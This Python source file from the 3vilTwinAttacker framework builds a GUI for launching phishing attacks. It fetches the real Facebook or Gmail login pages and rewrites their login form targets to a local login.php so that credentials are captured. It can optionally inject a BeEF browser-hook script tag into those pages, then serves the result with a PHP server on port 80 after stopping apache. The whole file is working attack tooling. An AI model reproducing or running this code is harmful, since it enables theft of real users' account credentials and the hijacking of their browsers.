#The MIT License (MIT)
#Copyright (c) 2015-2016 mh4x0f P0cL4bs Team
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from Core.Settings import frm_Settings
from Modules.utils import ProcessThread,Refactor,Beef_Hook_url
from os import popen,chdir,getcwd,getuid,devnull
from urllib2 import urlopen,URLError
threadloading = {'template':[],'posion':[]}
class frm_template(QDialog):
    def __init__(self, parent = None):
        super(frm_template, self).__init__(parent)
        self.label = QLabel()
        self.Main = QVBoxLayout(self)
        self.setGeometry(0, 0, 500, 100)
        self.center()
        self.control = None
        self.owd = getcwd()
        self.config = frm_Settings()
        self.loadtheme(self.config.XmlThemeSelected())
        global threadloading
        self.gui_temp()

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def gui_temp(self):
        self.frm0 = QFormLayout(self)
        self.frm1 = QFormLayout(self)
        self.check_face = QCheckBox('Facebook')
        self.check_gmail = QCheckBox('Gmail')
        self.check_route = QCheckBox('Router')
        self.check_beef = QCheckBox('Beef')
        self.check_custom = QCheckBox('Custom Phishing')
        self.EditBeef = QLineEdit(self)
        self.EditBeef.setEnabled(False)

        self.txt_html = QTextEdit(self)
        self.txt_html.setPlainText('<html>\n<head>\n<title>3vilTwinAttacker Phishing </title>'
        '\n</head>\n<body>\n'
        '\n<h3 align=\'center\'>3vilTwinAttacker Framework</h3>\n'
        '\n<p align=\'center\'>this is demo Attack Redirect.</p>\n'
        '\n</body>\n</html>')
        self.txt_html.setEnabled(False)
        # connect buton
        self.check_face.clicked.connect(self.check_options)
        self.check_gmail.clicked.connect(self.check_options)
        self.check_route.clicked.connect(self.check_options)
        self.check_beef.clicked.connect(self.check_options)
        self.check_custom.clicked.connect(self.check_options)

        self.txt_redirect =  QLineEdit(self)
        self.btn_start_template = QPushButton('Start Server HTTP')
        self.btn_start_template.clicked.connect(self.start_server)

        self.frm0.addRow(self.check_face)
        self.frm0.addRow(self.check_gmail)
        self.frm0.addRow(self.check_route)
        self.frm0.addRow(self.check_custom)
        h = QFrame(self)
        h.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        self.frm0.addRow(h)
        self.frm0.addRow(self.check_beef)
        self.frm0.addRow(QLabel('IP Redirect:'),self.txt_redirect)
        self.frm0.addRow("Beef Hook URL:",self.EditBeef)
        self.frm0.addRow(self.btn_start_template)

        layout = QHBoxLayout()
        layout.addWidget(self.txt_html)
        layout.addLayout(self.frm0)

        self.Main.addLayout(layout)
        self.setLayout(self.Main)

    @pyqtSlot(QModelIndex)
    def check_options(self,index):
        if self.check_face.isChecked():
            self.check_route.setChecked(False)
            self.check_gmail.setChecked(False)
        elif self.check_gmail.isChecked():
            self.check_face.setChecked(False)
            self.check_route.setChecked(False)
        else:
            self.check_face.setChecked(False)
            self.check_gmail.setChecked(False)

        if self.check_custom.isChecked():
            self.txt_html.setEnabled(True)
        else:
            self.txt_html.setEnabled(False)
        if self.check_beef.isChecked():
            self.EditBeef.setEnabled(True)
        else:
            self.EditBeef.setEnabled(False)

    def start_server(self):
        sock = None
        if self.check_face.isChecked():
            url = 'http://facebook.com'
            try:
                sock = urlopen(url).read()
                self.control = 'facebook'
            except URLError, e:
                QMessageBox.information(self,'Error',"Server not found, can't find the server at focebook." + str(e))
        elif self.check_gmail.isChecked():
            try:
                sock = urlopen('http://accounts.google.com/Login?hl').read()
                self.control = 'gmail'
            except URLError,e:
                QMessageBox.information(self,'Error',"Server not found, can't find the server at google." + str(e))
        elif self.check_route.isChecked():
            self.control = 'route'
        elif self.check_custom.isChecked():
            self.control = 'custom'
        else:
            QMessageBox.information(self,'Error','checkbox not checked.')

        if self.control != None:
            self.phishing_page(self.control,sock)
            if not len(threadloading['template']) == 0:
                self.deleteLater()
    def killThread(self):
        for i in threadloading['template']:
            i.stop(),i.join()
    def phishing_page(self,choice,sock):
            if choice == 'facebook':
                path = 'Modules/Phishing/Facebook/'
                try:
                    chdir(path)
                except OSError,e:
                    return None
                self.html = sock.replace('https://www.facebook.com/login.php?login_attempt=1', 'login.php')
                if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
                    self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
                    html_final = Beef_Hook_url(self.html,self.hook)
                    if html_final != None:
                        self.html = html_final
                    else: QMessageBox.information(self,'Error Hook Inject Page',
                        'Hook Url not injected, not found tag "<body>"')
                with open('index.html','w') as f:
                    f.write(str(self.html))
                    f.close()
            elif choice == 'route':
                path = 'Modules/Phishing/Route/'
                chdir(path)
            elif choice == 'custom':
                path = 'Modules/Phishing/Custom/'
                chdir(path)
                self.html = self.txt_html.toPlainText()
                if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
                    self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
                    html_final = Beef_Hook_url(self.html,self.hook)
                    if html_final != None:
                        self.html = html_final
                    else: QMessageBox.information(self,'Error Hook Inject Page',
                        'Hook Url not injected, not found tag <body>')
                with open('index.html','w') as f:
                    f.write(str(self.html))
                    f.close()
            elif choice == 'gmail':
                path = 'Modules/Phishing/Gmail/'
                try:
                    chdir(path)
                    request = urlopen('http://accounts.google.com/Login?hl').read()
                    self.html = request.replace('//ssl.gstatic.com/accounts/ui/','')
                    self.html = request.replace('https://accounts.google.com/ServiceLoginAuth','login.php')
                    if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
                        self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
                        html_final = Beef_Hook_url(self.html,self.hook)
                        if html_final != None:
                            self.html = html_final
                        else: QMessageBox.information(self,'Error Hook Inject Page',
                            'Hook Url not injected, not found tag "<body>"')
                    with open('index.html','w') as f:
                        f.write(str(self.html))
                        f.close()
                except OSError,e:
                    return None

            ip = str(self.txt_redirect.text())
            popen('service apache2 stop')
            if ip != None:
                Tphishing = ProcessThread(['php', '-S',ip+':80'])
                Tphishing.setName('Phishing:'+choice)
                threadloading['template'].append(Tphishing)
                Tphishing.start()
                self.emit(SIGNAL('Activated( QString )'),'started')
            else:
                QMessageBox.information(self,'Connection','Ipaddress not found')
